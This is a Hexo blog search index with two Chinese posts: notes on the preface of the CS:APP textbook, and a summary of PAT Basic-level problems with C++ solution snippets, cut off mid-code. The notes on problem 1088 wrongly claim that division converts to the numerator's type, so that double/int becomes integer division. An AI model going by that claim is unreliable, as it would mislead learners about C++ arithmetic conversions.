<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>深入理解计算机系统CS:APP</title>
    <url>/2020/10/21/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCS-APP/</url>
    <content><![CDATA[<p>深入理解计算机系统CS:APP是我非常喜欢的一本介绍计算机系统的书籍。他补充了我许多计算机基础知识，例如：编译，汇编，二进制补码，CPU流水线，高级语言的汇编优化，内存管理等等，很多计算机基础，都在这本书中涉及。他的阅读体验非常好，每节后面都有练习题并配有讲解答案，非常适合边学边练。</p>
<p>这里我针对每节的阅读，摘录我感兴趣的部分，并加以学习和拓展。当然，我不是第一次阅读了，说起来惭愧，每次想重读本书时，都不能坚持，这里我不想再拖了，我一定要坚持完成他！</p>
<a id="more"></a>
<h1 id="序言导论学习"><a href="#序言导论学习" class="headerlink" title="序言导论学习"></a>序言导论学习</h1><ul>
<li><p>现在一般认为问题抽象、系统抽象和数据抽象是计算机类专业毕业生的核心能力！— 《CSAPP:IX页中文版序二》</p>
<p>  作序者从软件角度给出了见解，说的非常的好，这也是序者作为软件工程领域顶尖人士的看法。</p>
<p>  我现在的认知考虑（2020-10-21），我认为，不能在做脱离实际的编程了，一定要了解计算机硬件与其体系结构，不管是当前中国计算机技术的环境，还是计算机技术在生活中的普及。都在告诉我们，不了解计算机硬件，结构，体系等诸多计算机技术，是搞不好计算机的，尤其是近些年来中国的芯片产业不断被打压，也正是由于”造不如买“等诸多听着有理，实际却非常错误的观念造成的，通过芯片，美国人告诉你，没有芯片这个硬通货，你软件写的再妙又有什么用？</p>
<p>  所以，我认为，当下计算机硬件，体系构造等领域急需大量人才，以芯片领域为例：就需要大量的物理学家（电路设计），化学家（电路刻蚀），数学家（逻辑设计）以及计算机科学家。所以学习计算机硬件，体系等非常重要！</p>
</li>
<li><p>深入研究方向：编译器、计算机体系结构、操作系统、嵌入式系统、网络互联和网络安全</p>
<p>  编译器：《编译原理》</p>
<p>  计算机体系结构：《计算机组成与设计：硬件/软件接口》、《计算机体系结构：量化研究方法》</p>
<p>  操作系统：《深入理解计算机系统：CSAPP》</p>
<p>  网络互联和网络安全：《计算机网络：自顶向下方法》、《TCP/IP详解》</p>
</li>
<li><p>x86-64是自<strong>1978</strong>年起，以8086微处理器为代表，不断进化的最新成果。</p>
<p>  为什么8086在中国的大学组成原理书中不断被提及学习，因为他是现代计算机芯片的鼻祖。x86 是英特尔微处理器产品线的命名规则，64是指其寻址长度达到64位，这也是我们有时候下载软件或者Linux系统时，会出现选择x86版本（32位版本）或者x86-64版本（64位版本）的区别。</p>
</li>
<li><p>了解一个c程序的生命周期，通过这个周期扩展了解计算机系统的主要概念和主题。 —《CSAPP：XIV本书概述-第1章》</p>
<p>  c，c++，java等编译型语言最重要的地方就在于他们是要编译的，与JavaScript，python等解释型语言相比。编译型不像解释型一样，由解释器将代码一句一句运行，而是以编译器，先将代码编译为机器代码，再加以运行。</p>
</li>
<li><p>不能用表达式( x - y &lt; 0) 来代替 (x &lt; y)，因为前者可能会产生溢出；也不能用表达式(-y &lt; -x) 来代替，因为补码表示中负数和正数的范围是不对称的。—《CSAPP：XIV本书概述-第2章》</p>
<p>  这里需要学习计算机中数字的二进制表示，为什么会溢出？正数和负数在计算机中如何表示？他们如何计算？他们的取值范围是什么？这些都在第2章中将被解析。</p>
</li>
<li><p>程序在计算机中的机器级表示。栈和寄存器的使用，不同控制结构（条件，循环，递归等）生成的汇编指令，通过这里可以懂得程序在机器上是如何表示的。 —《CSAPP：XIV本书概述-第3章》</p>
</li>
<li><p>基本的组合和时序逻辑元素，并展示这些元素如何在数据通路中组合到一起。—《CSAPP：XIV本书概述-第4章》</p>
<p>  一个最重要的概念：<strong>流水线（Pipeline）</strong>是一个非常好的设计理念，不管是在计算机中还是工厂中，运用非常广泛，也非常的有效率，他将CUP的处理效率提升了几倍！</p>
</li>
<li><p>让程序员通过使编译器能够生成更有效的机器代码来学习编写C代码。你会惊讶于C代码做的一些简单变换能给程序带来多大的速度提升！—《CSAPP：XIV本书概述-第5章》</p>
<p>  你可能没想过，C语言一些简单的如：调整代码顺序，简单的增加几句就可以提升代码速度，这是很神奇的一件事情！</p>
</li>
<li><p>存储器是由不同容量、造假和访问时间的存储设备组成的<strong>层次结构</strong>。—《CSAPP：XIV本书概述-第6章》</p>
<p>  <strong>存储器的层次结构</strong>在计算机中是一个非常重要的概念，从寄存器，CPU高速缓存，内存，ssd，硬盘都是层次结构中的一员，他们共同贡献自己的力量，让你感觉计算机的存储既快速又宽阔。</p>
</li>
<li><p>连接器生成的目标文件是与一些像加载、虚拟内存和内存映射这样的概念相关的。—《CSAPP：XIV本书概述-第7章》</p>
</li>
<li><p><strong>进程</strong>的基本概念，进程是对一个正在执行的程序的一种抽象。—《CSAPP：XIV本书概述-第8章》</p>
<p>  <strong>进程</strong>是非常重要的，一个进程可以说就是一个应用程序，它包含了虚拟内存，进程管理，并发性等概念，可以说操作系统下就是进程了。</p>
</li>
<li><p><strong>虚拟内存</strong>，为什么不同的并发进程各自都有一个完全相同的地址范围，能共享某些页，而又独占另一些页。计算机是如何做到让每一个进程看到的内存都是一样连续和可用的，那就是虚拟内存！—《CSAPP：XIV本书概述-第9章》</p>
</li>
<li><p>系统级I/O —《CSAPP：XIV本书概述-第10章》</p>
</li>
<li><p>网络编程 —《CSAPP：XIV本书概述-第11章》</p>
<p>  Socket套接字编程，Java有很好的实现，并且可以选择TCP和UDP可靠和不可靠传输协议，可以通过Java来了解。</p>
</li>
<li><p>并发编程，<strong>三种编写并发程序的基本机制（进程、IO多路复用、线程）</strong>；探讨了用P、V信号量操作来实现同步、线程安全和可重入、竞争条件以及死锁等的基本原则。—《CSAPP：XIV本书概述-第12章》</p>
<p>  <strong>进程，线程，PV信号量</strong>这三个是非常重要的概念，进程 &gt; 线程，所以，经常可以看到，进程中存在线程的并行等操作。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>操作系统</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>PAT乙级95题总结</title>
    <url>/2019/12/28/PAT%E4%B9%99%E7%BA%A790%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>本章面对PAT-乙级程序设计，共总结了16种类型题目，并总结了重点题目以及分析，同时附上<a href="/images/PAT乙级总结.pdf" download="PAT乙级前95题总结.pdf" style="color:#027EF2">PDF下载</a>，以供打印的需要。</p>
<h1 id="类型一：模拟类"><a href="#类型一：模拟类" class="headerlink" title="类型一：模拟类"></a>类型一：模拟类</h1><p>按照题目要求编码，主要考察<strong>代码能力</strong>，并列出实际操作中较难题目。</p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1050</td>
<td style="text-align:center"><strong>螺旋矩阵（25 分）</strong></td>
<td style="text-align:center">逻辑，二维vector</td>
</tr>
<tr>
<td style="text-align:center">B1068</td>
<td style="text-align:center"><strong>万绿丛中一点红（20 分）</strong></td>
<td style="text-align:center">涉及图的周围八个方向索引技巧</td>
</tr>
<tr>
<td style="text-align:center">B1088</td>
<td style="text-align:center"><strong>三人行（20 分）</strong></td>
<td style="text-align:center">类型强转和自动转化，题目有小bug</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h2 id="1050-螺旋矩阵-（25-分）"><a href="#1050-螺旋矩阵-（25-分）" class="headerlink" title="1050 螺旋矩阵 （25 分）"></a>1050 螺旋矩阵 （25 分）</h2><p>本题要求将给定的 N 个正整数按非递增的顺序，填入“螺旋矩阵”。所谓“螺旋矩阵”，是指从左上角第 1 个格子开始，按顺时针螺旋方向填充。要求矩阵的规模为 m 行 n 列，满足条件：$m×n$ 等于 N；$m≥n$；且 $m−n$ 取所有可能值中的最小值。<br><strong>输入格式：</strong><br>输入在第 1 行中给出一个正整数 N，第 2 行给出 N 个待填充的正整数。所有数字不超过 $10^4$，相邻数字以空格分隔。<br><strong>输出格式：</strong><br>输出螺旋矩阵。每行 n 个数字，共 m 行。相邻数字以 1 个空格分隔，行末不得有多余空格。<br><strong>输入样例：</strong></p>
<blockquote>
<p>12<br>37 76 20 98 76 42 53 95 60 81 58 93</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>98 95 93<br>42 37 81<br>53 20 76<br>58 60 76</p>
</blockquote>
<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><p><strong>1. 条件：满足条件：$m×n$ 等于 N；$m≥n$；且 $m−n$ 取所有可能值中的最小值，$m×n$怎么求？</strong></p>
<ul>
<li>首先，对N（总数）开方，所得应该是m（行数）和n（列数）最接近时的n值，并且应该是n的最大值，但这个n不一定满足<code>N%n==0</code>，也即不能得到<strong>整数</strong>的行，所以应该再用循环判断n~1中满足<code>N%n==0</code>条件的情况，那么就可以得到m和n最接近情况下的正<strong>整数</strong>m和n了。</li>
</ul>
<p><strong>2. 如何声明螺旋矩阵？</strong></p>
<ul>
<li>声明vector；<code>vector&lt;int&gt; a(N);//存储输入数组</code></li>
<li>声明二维vector；<code>vector&lt;vector&lt;int&gt;&gt; b(m,vector&lt;int&gt;(n));</code>这个声明很有用，声明了存储vector的vector，并在圆括号指明了为m大小，且用n大小的vector填充每一个元素。</li>
</ul>
<p><strong>3. 如何构造螺旋矩阵？</strong><br>主要分为四部分，例如：<br><img src="/images/螺旋循环.png" alt="Alt text"></p>
<ol>
<li><p>水平的-第一行：<code>0 ~ 4（0 ~ n列）</code>，应放在二维数组第一行；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> j = i;  <span class="comment">//1. 水平的-第一行</span></span><br><span class="line"><span class="keyword">while</span> (j &lt; n - i)&#123;</span><br><span class="line">	b[i][j++] = a[k++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>垂直的-最后一列：<code>5 ~ 8（i+1 ~ m-i-1行）</code>，应放在二维数组最后一列；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">j = i + <span class="number">1</span>; <span class="comment">//2.垂直的-最后一列</span></span><br><span class="line"><span class="keyword">while</span> (j &lt; m - i)&#123;</span><br><span class="line">	b[j++][n - i - <span class="number">1</span>] = a[k++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>水平的-最后一行：<code>9 ~ 11（n-i-2 ~ i+1列）</code>，应放在二维数组最后一行；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">j = n - i - <span class="number">2</span>;  <span class="comment">//3.水平的-最后一行</span></span><br><span class="line"><span class="keyword">while</span> (j &gt; i)&#123;</span><br><span class="line">	b[m - i - <span class="number">1</span>][j--] = a[k++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>竖直的-第一列：<code>12 ~ 15（m-i-1 ~ i+1行）</code>，应放在二维数组第一列。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">j = m - i - <span class="number">1</span>;  <span class="comment">//4.竖直的-第一列</span></span><br><span class="line"><span class="keyword">while</span> (j &gt; i)&#123;</span><br><span class="line">	b[j--][i] = a[k++];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>通过这四步就完成了一个外层圈，后续再加上相应的条件，即可构造整个二维数组，这里有两种方法：</p>
<p><strong>法一</strong>：通过一维数组索引判断即可<code>k &lt; N</code>，不需要多余的条件就可以完成。</p>
<blockquote>
<p>且需注意内层for或while循环中还要控制k &lt; N，因为如果螺旋矩阵中所有的元素已经都填充完毕，就不能再重复填充，例如N=5时，为 5 × 1 的矩阵，如果不加这个判断，则会在 步骤<code>1.</code> <code>2.</code>中完成了二维数组，但是在步骤<code>4.</code>时，<code>j = 5-0-1=4</code>，且满足<code>(j&gt;i)--(4&gt;0)</code>，所以又会进入赋值分支，造成数组越界问题，所以控制 k &lt; N 是很必要的。</p>
</blockquote>
<p><strong>局部代码</strong>（使用while代码要简化些）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//b是螺旋矩阵，a是输入数组</span></span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (k &lt; N)&#123;</span><br><span class="line">    <span class="keyword">int</span> j = i;  <span class="comment">//1. 水平的-第一行</span></span><br><span class="line">    <span class="keyword">while</span> (j &lt; n - i &amp;&amp; k &lt; N)&#123;</span><br><span class="line">        b[i][j++] = a[k++];</span><br><span class="line">    &#125;</span><br><span class="line">    j = i + <span class="number">1</span>;  <span class="comment">//2.垂直的-最后一列</span></span><br><span class="line">    <span class="keyword">while</span> (j &lt; m - i &amp;&amp; k &lt; N)&#123;</span><br><span class="line">        b[j++][n - i - <span class="number">1</span>] = a[k++];</span><br><span class="line">    &#125;</span><br><span class="line">    j = n - i - <span class="number">2</span>;  <span class="comment">//3.水平的-最后一行</span></span><br><span class="line">    <span class="keyword">while</span> (j &gt; i &amp;&amp; k &lt; N)&#123;</span><br><span class="line">        b[m - i - <span class="number">1</span>][j--] = a[k++];</span><br><span class="line">    &#125;</span><br><span class="line">    j = m - i - <span class="number">1</span>;  <span class="comment">//4.竖直的-第一列</span></span><br><span class="line">    <span class="keyword">while</span> (j &gt; i &amp;&amp; k &lt; N)&#123;</span><br><span class="line">        b[j--][i] = a[k++];</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>法二</strong>：通过层数循环，<strong>通过m计算螺旋矩阵的层数level，如果m的值为偶数，层数为 m/2，如果m为奇数，层数为 m/2 + 1，所以level = m/2 + m%2；</strong>。且同法一一样需要注意内层循环中还要控制 k &lt; N。</p>
<p><strong>局部代码</strong>（这里使用for和while比对）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//b是螺旋矩阵，a是输入数组</span></span><br><span class="line"><span class="keyword">int</span> level = m / <span class="number">2</span> + m % <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; level;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; n - i&amp;&amp;k &lt; N; j++)&#123;</span><br><span class="line">        b[i][j] = a[k++];<span class="comment">//1. 水平的-第一行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; m - i&amp;&amp;k &lt; N; j++)&#123;</span><br><span class="line">        b[j][n - i - <span class="number">1</span>] = a[k++];<span class="comment">//2.垂直的-最后一列</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = n - i - <span class="number">2</span>; j &gt; i&amp;&amp;k &lt; N; j--)&#123;</span><br><span class="line">        b[m-i<span class="number">-1</span>][j] = a[k++];<span class="comment">// 3.水平的 - 最后一行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//4.垂直的-第一行</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = m - i - <span class="number">1</span>; j &gt; i&amp;&amp;k &lt; N; j--)&#123;</span><br><span class="line">        b[j][i] = a[k++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1068-万绿丛中一点红-（20-分）"><a href="#1068-万绿丛中一点红-（20-分）" class="headerlink" title="1068 万绿丛中一点红 （20 分）"></a>1068 万绿丛中一点红 （20 分）</h2><p>对于计算机而言，颜色不过是像素点对应的一个 24 位的数值。现给定一幅分辨率为 $M×N$ 的画，要求你找出万绿丛中的一点红，即有独一无二颜色的那个像素点，并且该点的颜色与其周围 8 个相邻像素的颜色差充分大。<br><strong>输入格式：</strong><br>输入第一行给出三个正整数，分别是 M 和 $N(≤ 1000)$，即图像的分辨率；以及 TOL，是所求像素点与相邻点的颜色差阈值，色差超过 TOL 的点才被考虑。随后 N 行，每行给出 M 个像素的颜色值，范围在 $[0,2^{24})$ 内。所有同行数字间用空格或 TAB 分开。<br><strong>输出格式：</strong><br>在一行中按照 <code>(x, y): color</code> 的格式输出所求像素点的位置以及颜色值，其中位置 x 和 y 分别是该像素在图像矩阵中的列、行编号（从 1 开始编号）。如果这样的点不唯一，则输出 <code>Not Unique</code>；如果这样的点不存在，则输出 <code>Not Exist</code>。<br><strong>输入样例 1：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">6</span> <span class="number">200</span></span><br><span class="line"><span class="number">0</span> 	 <span class="number">0</span>	  <span class="number">0</span> 	   <span class="number">0</span>	    <span class="number">0</span> 	     <span class="number">0</span> 	      <span class="number">0</span>        <span class="number">0</span></span><br><span class="line"><span class="number">65280</span> 	 <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">16711479</span> <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span></span><br><span class="line"><span class="number">16711479</span> <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">16711680</span> <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span></span><br><span class="line"><span class="number">65280</span> 	 <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">165280</span>   <span class="number">165280</span></span><br><span class="line"><span class="number">65280</span> 	 <span class="number">65280</span> 	  <span class="number">16777015</span> <span class="number">65280</span>    <span class="number">65280</span>    <span class="number">165280</span>   <span class="number">65480</span>    <span class="number">165280</span></span><br><span class="line"><span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span> <span class="number">16777215</span></span><br></pre></td></tr></table></figure>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>(5, 3): 16711680</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">5</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>Not Unique</p>
</blockquote>
<p><strong>输入样例 3：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="number">5</span> <span class="number">6</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p><strong>输出样例 3：</strong></p>
<blockquote>
<p>Not Exist</p>
</blockquote>
<h3 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><p>这个题的难点在于查找周围八个方向，一开始我的思路是，先判断边界，再去比较，但是这样的逻辑太复杂，需要考虑各种边界情况，以至于陷入逻辑深水中。</p>
</li>
<li><p>更好的思路：应更换思路，<strong>对于八个方向先不管边界，得出边界索引后，再去判断是否溢出边界，这样的好处，不用对于每一种边界都去判断，仅根据得到索引去判断。</strong>同时，利用图处理类似方法所采用的二维数组策略，可以更方便。</p>
</li>
</ul>
<p><strong>局部代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">八个方向的行列索引差值，使用二维数组更形象方便。</span></span><br><span class="line"><span class="comment">&#123; -1, -1 &#125;    &#123; -1, 0 &#125;    &#123; -1, 1 &#125;</span></span><br><span class="line"><span class="comment">&#123; 0, -1 &#125;    &#123; i，j &#125;     &#123; 0, 1 &#125;</span></span><br><span class="line"><span class="comment">&#123; 1, -1 &#125;    &#123; 1, 0 &#125;    &#123; 1, 1 &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123; &#123; <span class="number">-1</span>, <span class="number">-1</span> &#125;, &#123; <span class="number">-1</span>, <span class="number">0</span> &#125;, &#123; <span class="number">-1</span>, <span class="number">1</span> &#125;, &#123; <span class="number">0</span>, <span class="number">-1</span> &#125;, &#123; <span class="number">0</span>, <span class="number">1</span> &#125;, &#123; <span class="number">1</span>, <span class="number">-1</span> &#125;, &#123; <span class="number">1</span>, <span class="number">0</span> &#125;, &#123; <span class="number">1</span>, <span class="number">1</span> &#125; &#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> tx = x + dir[i][<span class="number">0</span>];<span class="comment">//得到每个方向的x值</span></span><br><span class="line">        <span class="keyword">int</span> ty = y + dir[i][<span class="number">1</span>];<span class="comment">//得到每个方向的y值</span></span><br><span class="line">        <span class="comment">//越界判断，先计算索引，再判断会更方便</span></span><br><span class="line">        <span class="keyword">if</span> (tx &gt;= <span class="number">0</span> &amp;&amp; tx &lt; N &amp;&amp; ty &gt;= <span class="number">0</span> &amp;&amp; ty &lt; M)&#123; </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">abs</span>(v[x][y] - v[tx][ty]) &lt;= TOL)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1088-三人行-（20-分）"><a href="#1088-三人行-（20-分）" class="headerlink" title="1088 三人行 （20 分）"></a>1088 三人行 （20 分）</h2><p>子曰：“三人行，必有我师焉。择其善者而从之，其不善者而改之。”<br>本题给定甲、乙、丙三个人的能力值关系为：甲的能力值确定是 2 位<strong>正整数</strong>；把甲的能力值的 2 个数字调换位置就是乙的能力值；甲乙两人能力差是丙的能力值的 X 倍；乙的能力值是丙的 Y 倍。请你指出谁比你强应“从之”，谁比你弱应“改之”。<br><strong>输入格式：</strong><br>输入在一行中给出三个数，依次为：M（你自己的能力值）、X 和 Y。三个数字均为不超过 1000 的正整数。<br><strong>输出格式：</strong><br>在一行中首先输出甲的能力值，随后依次输出甲、乙、丙三人与你的关系：如果其比你强，输出<code>Cong</code>；平等则输出<code>Ping</code>；比你弱则输出<code>Gai</code>。其间以1个空格分隔，行首尾不得有多余空格。<br>注意：如果解不唯一，则以甲的最大解为准进行判断；如果解不存在，则输出 <code>No Solution</code>。<br><strong>输入样例 1：</strong></p>
<blockquote>
<p>48 3 7</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>48 Ping Cong Gai</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>48 11 6</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>No Solution</p>
</blockquote>
<h3 id="对题目有异议"><a href="#对题目有异议" class="headerlink" title="对题目有异议"></a>对题目有异议</h3><ul>
<li>甲的能力值确定是 2 位<strong>正整数</strong>，0不是正整数，那么甲应该是两位1~9的数字组成的，但是，在提交时，却有一个点不通过，当加上个位数可以为0后，通过了，则说明这个条件是有问题的。</li>
</ul>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li>甲乙可以看出一定是整数，但是乙却不一定，所以对于乙的判断，应该用<code>double</code>去判断。</li>
</ul>
<p><strong>1. 除法的类型转换是以分子类型为准</strong></p>
<ul>
<li><code>int/double</code>会先将<code>int</code>转化为<code>double</code>，在进行除法计算。</li>
<li>同理，<code>double/int</code>是将<code>double</code>转化为<code>int</code>型，在进行除法计算，这个一定要注意。</li>
</ul>
<hr>
<h1 id="类型二：查找元素"><a href="#类型二：查找元素" class="headerlink" title="类型二：查找元素"></a>类型二：查找元素</h1><table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1028</td>
<td style="text-align:center"><strong>人口普查 （20 分）</strong></td>
<td style="text-align:center">YY-MM-HH形式比较</td>
</tr>
</tbody>
</table>
<h2 id="B1028人口普查-（20-分）"><a href="#B1028人口普查-（20-分）" class="headerlink" title="B1028人口普查 （20 分）"></a>B1028人口普查 （20 分）</h2><p>某城镇进行人口普查，得到了全体居民的生日。现请你写个程序，找出镇上最年长和最年轻的人。<br>这里确保每个输入的日期都是合法的，但不一定是合理的——假设已知镇上没有超过 200 岁的老人，而今天是 2014 年 9 月 6 日，所以超过 200 岁的生日和未出生的生日都是不合理的，应该被过滤掉。<br><strong>输入格式：</strong><br>输入在第一行给出正整数 N，取值在$(0,10^5]$；随后 N 行，每行给出 1 个人的姓名（由不超过 5 个英文字母组成的字符串）、以及按 <code>yyyy/mm/dd</code>（即年/月/日）格式给出的生日。题目保证最年长和最年轻的人没有并列。<br><strong>输出格式：</strong><br>在一行中顺序输出有效生日的个数、最年长人和最年轻人的姓名，其间以空格分隔。<br><strong>输入样例：</strong></p>
<blockquote>
<p>5<br>John 2001/05/12<br>Tom 1814/09/06<br>Ann 2121/01/30<br>James 1814/09/05<br>Steve 1967/11/20</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>3 Tom John</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>方法一</strong>. 年月日比较法，按顺序依次比较年月日，封装成函数。注意：结果为0时，只需要输出0，而不需要其他任何，<strong>包括空格</strong>。<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> person&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">&#125;temP,maxP,minP,max,min;</span><br><span class="line"><span class="comment">//年份，月份，天均小于等于 --- 年龄等于大于</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">lessEqu</span><span class="params">(person p1,person p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p1.year != p2.year)</span><br><span class="line">        <span class="keyword">return</span> p1.year &lt;= p2.year;</span><br><span class="line">    <span class="keyword">if</span> (p1.month != p2.month)</span><br><span class="line">        <span class="keyword">return</span> p1.month &lt;= p2.month;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> p1.day &lt;= p2.day;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//年份，月份，天均大于等于 --- 年龄等于小于</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">moreEqu</span><span class="params">(person p1, person p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p1.year != p2.year)</span><br><span class="line">        <span class="keyword">return</span> p1.year &gt;= p2.year;</span><br><span class="line">    <span class="keyword">if</span> (p1.month != p2.month)</span><br><span class="line">        <span class="keyword">return</span> p1.month &gt;= p2.month;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> p1.day &gt;= p2.day;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>方法二</strong>. 利用字符串的顺序比较，借助<code>STL的string</code>直接比较得出结果，不需要封装函数。<br><strong>完整代码</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">string</span> s1, s2, left = <span class="string">"1814/09/06"</span>, right = <span class="string">"2014/09/06"</span>;</span><br><span class="line">    <span class="built_in">string</span> max = right, min = left, maxName, minName;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; s1 &gt;&gt; 